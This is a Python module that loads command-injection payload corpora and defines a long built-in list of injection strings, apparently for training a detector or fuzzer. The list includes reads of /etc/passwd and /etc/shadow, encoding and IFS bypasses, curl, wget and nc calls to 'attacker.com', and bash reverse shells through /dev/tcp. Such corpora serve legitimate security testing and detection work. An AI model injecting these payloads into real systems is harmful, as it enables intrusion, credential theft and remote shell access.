"""Load and normalize raw command-injection payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    s = line.strip()
    if not s or s.startswith("#"):
        return ""
    return s

def load_payloads_from_file(path: Path) -> list[str]:
    out = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out

def load_payloads_from_dir(root: Path) -> list[str]:
    root = Path(root)
    seen = set()
    out = []
    for f in sorted(root.rglob("*.txt")) if root.is_dir() else []:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out

BUILTIN_PAYLOADS = [
    # --- Core command separators (Unix) ---
    ";whoami",
    "|whoami",
    "&&whoami",
    "&whoami",
    "`whoami`",
    "$(whoami)",
    ";id",
    "|id",
    "&&id",
    "|| whoami",
    "&& id",
    # --- File read via injection ---
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "&&cat /etc/passwd",
    ";cat /etc/shadow",
    "|cat /etc/shadow",
    ";ls -la",
    "|ls -la",
    "&&ls -la",
    ";ls -la /",
    # --- Echo / proof-of-concept ---
    "; echo test",
    "| echo test",
    "&& echo test",
    "& echo test",
    # --- Command substitution variants ---
    "$(cat /etc/passwd)",
    "`id`",
    "`cat /etc/passwd`",
    ";$({whoami})",
    # --- Newline / CRLF injection ---
    ";\nwhoami",
    "|\nwhoami",
    "&&\nwhoami",
    "%0awhoami",
    "%0dwhoami",
    "%0a%0dwhoami",
    "%0aid",
    # --- Network / exfil (Unix) ---
    "; nc -e /bin/sh attacker.com 4444",
    "; curl http://attacker.com/",
    "; wget http://attacker.com/",
    "| nc -e /bin/sh attacker.com 4444",
    "| curl http://attacker.com/",
    "&& curl http://attacker.com/",
    # --- Reverse shells ---
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    # --- Windows / PowerShell ---
    "; powershell -c \"whoami\"",
    "| powershell -c \"id\"",
    "& powershell -c \"whoami\"",
    "&& powershell -c \"whoami\"",
    "|| powershell -c \"whoami\"",
    # --- Redirect-to-file (marker creation) ---
    "; echo hacked > /tmp/pwned",
    "| echo hacked > /tmp/pwned",
    "&& echo hacked > /tmp/pwned",
    "&& echo hacked > C:\\Windows\\Temp\\pwned.txt",
    "; echo hacked > C:\\Windows\\Temp\\pwned.txt",
    # --- Subshell / grouping ---
    "; (whoami)",
    "| (id)",
    "&& (whoami)",
    "; { whoami; }",
    # --- Whitespace / IFS bypass ---
    ";${IFS}whoami",
    "|${IFS}id",
    # --- Additional volume for training ---
    "; whoami",
    "| whoami",
    "&& whoami",
    "& whoami",
    "|| whoami",
    "; id",
    "| id",
    "&& id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; cat /etc/shadow",
    "| cat /etc/shadow",
    "; ls -la",
    "| ls -la",
    "&& ls -la",
    "; echo pwned",
    "| echo pwned",
    "&& echo pwned",
    "& echo pwned",
    "|| echo pwned",
    "; uname -a",
    "| uname -a",
    "&& uname -a",
    "; ifconfig",
    "| ifconfig",
    "; ip addr",
    "| ip addr",
    "; netstat -an",
    "| netstat -an",
    "; ps aux",
    "| ps aux",
    "; env",
    "| env",
    "; printenv",
    "| printenv",
    "; whoami; id",
    "| whoami; id",
    "; id; whoami",
    "; cat /etc/hosts",
    "| cat /etc/hosts",
    "; cat /etc/issue",
    "| cat /etc/issue",
    "; cat /proc/version",
    "| cat /proc/version",
    "; cat /proc/cpuinfo",
    "| cat /proc/cpuinfo",
    "; hostname",
    "| hostname",
    "&& hostname",
    "; pwd",
    "| pwd",
    "; date",
    "| date",
    "; uptime",
    "| uptime",
    "; w",
    "| w",
    "; last",
    "| last",
    "; df -h",
    "| df -h",
    "; free -m",
    "| free -m",
    "; mount",
    "| mount",
    "; lsmod",
    "| lsmod",
    "; find / -name flag.txt",
    "| find / -name flag.txt",
    "; find / -perm -4000",
    "| find / -perm -4000",
    "; grep root /etc/passwd",
    "| grep root /etc/passwd",
    "; awk 'NR==1' /etc/passwd",
    "| awk 'NR==1' /etc/passwd",
    "; head /etc/passwd",
    "| head /etc/passwd",
    "; tail /etc/passwd",
    "| tail /etc/passwd",
    "; sort /etc/passwd",
    "| sort /etc/passwd",
    "; uniq /etc/passwd",
    "| uniq /etc/passwd",
    "; wc /etc/passwd",
    "| wc /etc/passwd",
    "; base64 /etc/passwd",
    "| base64 /etc/passwd",
    "; rev /etc/passwd",
    "| rev /etc/passwd",
    "; xxd /etc/passwd",
    "| xxd /etc/passwd",
    "; strings /bin/login",
    "| strings /bin/login",
    "; which bash",
    "| which bash",
    "; which python",
    "| which python",
    "; which python3",
    "| which python3",
    "; which nc",
    "| which nc",
    "; which curl",
    "| which curl",
    "; which wget",
    "| which wget",
    "; export PATH",
    "| export PATH",
    "; set",
    "| set",
    "; declare",
    "| declare",
    "; compgen -c",
    "| compgen -c",
    "; ls /",
    "| ls /",
    "; ls /home",
    "| ls /home",
    "; ls /tmp",
    "| ls /tmp",
    "; ls /var",
    "| ls /var",
    "; ls /opt",
    "| ls /opt",
    "; ls /root",
    "| ls /root",
    "; ls /etc",
    "| ls /etc",
    "; ls /bin",
    "| ls /bin",
    "; ls /usr/bin",
    "| ls /usr/bin",
    "; ls /usr/local/bin",
    "| ls /usr/local/bin",
    "; ls /sbin",
    "| ls /sbin",
    # --- Substitution variants (extra volume) ---
    "$(id)",
    "$(ls -la)",
    "$(cat /etc/passwd)",
    "$(uname -a)",
    "$(hostname)",
    "$(pwd)",
    "$(whoami; id)",
    "`ls -la`",
    "`uname -a`",
    "`hostname`",
    "`pwd`",
    "`cat /etc/hosts`",
    "`cat /proc/version`",
    "`id; whoami`",
    # --- Encoded / bypass ---
    "%3Bwhoami",
    "%7Cwhoami",
    "%26whoami",
    "%26%26whoami",
    "; WHOAMI",
    "| WHOAMI",
    "; Whoami",
    "| Whoami",
    "; /bin/sh",
    "| /bin/sh",
    "; /bin/bash",
    "| /bin/bash",
    "; /usr/bin/id",
    "| /usr/bin/id",
    "; /usr/bin/whoami",
    "| /usr/bin/whoami",
    # --- Plain valid strings (always pass can_fire check in shell_command) ---
    "whoami",
    "id",
    "ls",
    "cat /etc/passwd",
    "uname -a",
    "hostname",
    "pwd",
    "echo test",
    # --- Benign (never fire) ---
    "localhost",
    "127.0.0.1",
    "hello",
    "123",
    "test_input",
    "example.com",
]

def load_all_corpora(raw_dir: Path) -> list[str]:
    raw_dir = Path(raw_dir)
    seen = set()
    out = []
    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for p in load_payloads_from_dir(d):
                if p not in seen:
                    seen.add(p)
                    out.append(p)
    for p in BUILTIN_PAYLOADS:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out
